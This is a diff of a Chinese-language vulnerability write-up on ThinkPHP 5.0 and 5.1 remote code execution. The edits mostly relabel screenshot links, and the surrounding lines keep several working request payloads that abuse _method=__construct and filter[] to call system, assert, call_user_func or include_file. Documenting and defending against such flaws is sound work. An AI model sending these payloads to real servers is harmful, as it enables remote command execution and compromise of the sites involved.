@@ -52,9 +52,10 @@ Connection: close
 s=whoami&_method=__construct&filter[]=system
 ```
 
-POC执行结果如下图：   ![1](1.png)
+POC执行结果如下图：   
+   ![](1.png)
 
-   ![2](2.png)
+   ![](2.png)
 
 
 
@@ -62,15 +63,15 @@ POC执行结果如下图：   ![1](1.png)
 
 在5.0.12之后的版本中，在`thinkphp/library/think/App.php的module`方法中增加了设置filter过滤属性的代码
 
-   ![3](3.png)
+   ![](3.png)
 
 开启debug调试模式，打开配置文件`config.php`
 
-   ![4](4.png)
+   ![](4.png)
 
 修改为
 
-   ![5](5.png)
+   ![](5.png)
 
 
 
@@ -93,8 +94,8 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
 
 POC执行结果如下图：   
 
-   ![6](6.png)
-   ![7](7.png)
+   ![](6.png)
+   ![](7.png)
 
   >Payload 2
 
@@ -115,8 +116,8 @@ _method=__construct&filter[]=think\__include_file&server[]=phpinfo&get[]=../runt
 
 POC执行结果如下图：   
 
-   ![8](8.png)
-   ![9](9.png)
+   ![](8.png)
+   ![](9.png)
 
   >Payload 3
 
@@ -137,7 +138,7 @@ _method=__construct&filter[]=assert&server[]=phpinfo&get[]=phpinfo()
 
 POC执行结果如下图：   
 
-   ![10](10.png)
+   ![](10.png)
 
 
   >Payload 4
@@ -159,7 +160,7 @@ _method=__construct&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
 
 POC执行结果如下图：   
 
-   ![11](11.png)
+   ![](11.png)
 
 ## 版本 5.1.10（PHP7.3.4+Apache2.4.39）
 
@@ -186,15 +187,15 @@ c=system&f=whoami&_method=filter
 
 一开始执行结果如下图：
 
-![12](12.png)
+![](12.png)
 
 找到RuleGroup.php 新增一行代码error_reporting(0);跳过报错
 
-![13](13.png)
+![](13.png)
 
 然后查看结果
 
-![14](14.png)
+![](14.png)
 
 # 漏洞防御
 
@@ -204,7 +205,7 @@ c=system&f=whoami&_method=filter
 
 3. 手动增加过滤，在`thinkphp/library/think/Request.php`添加如下代码：
 
-   ![12](12.png)
+   ![](15.png)
    
    
 
